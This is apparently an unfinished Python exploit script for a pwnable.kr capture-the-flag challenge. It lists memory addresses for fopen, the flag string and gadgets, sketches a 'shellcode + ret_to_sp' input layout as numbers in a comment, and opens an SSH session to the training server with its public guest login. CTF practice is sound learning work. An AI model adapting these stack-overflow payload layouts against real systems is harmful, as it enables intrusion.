#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from binaryfang import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1

#p =dd remote("127.0.0.1", 7777)
'''

2570 2570 + shellcode + ret_to_sp.

2570 2570 49739 65359 15685 13054 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 63909

2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 0 69 64590 65085 65176 0 54871 64111 121 1 1 1 1
2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 0 69 64590 65095 65176 0 54871 64111 121 1 1 1 1

'''

fopen   = 56338
flag    = 65085 
mode_r  = 65176
ppr     = 64608
fsize   = 64878
main    = 64111
offset  = 64102

con = ssh(host="pwnable.kr",port=2222,user="dos",password="guest")
con.interactive()
